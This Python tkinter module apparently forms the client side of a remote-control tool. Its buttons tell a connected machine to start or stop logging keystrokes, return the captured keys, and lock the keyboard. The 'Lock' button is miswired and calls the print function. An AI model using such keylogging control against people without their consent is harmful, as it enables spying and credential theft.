from CheckConnect import check_connect
from tkinter import *
from tkinter.ttk import *
import socket
from SendObject import send_obj, receive_obj

def Hook(s):
    if check_connect(s) == False: return
    request = ['keystroke', 'hook']
    send_obj(s, request)
    pass

def Unhook(s):
    if check_connect(s) == False: return
    request = ['keystroke', 'unhook']
    send_obj(s, request)
    pass

def Delete(s, t):
    t.delete('1.0', END)
    pass

def PrintKeyBoard(s, t):
    if check_connect(s) == False: return
    request = ['keystroke', 'print keyboard']
    send_obj(s, request)
    data = receive_obj(s)
    t.insert(END, data)
    pass

def LockKeyBoard(s):
  request = ['keystroke', 'lock']
  send_obj(s, request)
  pass

def key_stroke(s, frame):
    if check_connect(s) == False: return
    root = frame
    for widget in root.winfo_children():
        widget.destroy()
    root.configure(text='Key Stroke')

    my_scrollbar = Scrollbar(root, orient=VERTICAL)
    t = Text(root, yscrollcommand=my_scrollbar.set)
    t.place(relx=0.04, rely=0.2, relwidth=0.87, relheight=0.7)
    my_scrollbar.config(command=t.yview)
    my_scrollbar.place(relx=0.91, rely=0.2, relwidth=0.05, relheight=0.7)

    Button(root, text='Hook', command = lambda: Hook(s)).place(relx=0.05, rely=0.05, relwidth=0.15, relheight=0.1)
    Button(root, text='Unhook', command = lambda: Unhook(s)).place(relx=0.24, rely=0.05, relwidth=0.15, relheight=0.1)
    Button(root, text='Delete', command = lambda: Delete(s, t)).place(relx=0.43, rely=0.05, relwidth=0.15, relheight=0.1)
    Button(root, text='PrintKey', command = lambda: PrintKeyBoard(s, t)).place(relx=0.62, rely=0.05, relwidth=0.15, relheight=0.1)
    Button(root, text='Lock', command = lambda: PrintKeyBoard(s, t)).place(relx=0.81, rely=0.05, relwidth=0.15, relheight=0.1)

    # def on_closing():
    #     send_obj(s, ['keystroke', 'unhook'])
    #     root.destroy()
    #     pass
    # root.protocol("WM_DELETE_WINDOW", on_closing)
    # root.mainloop()

    pass
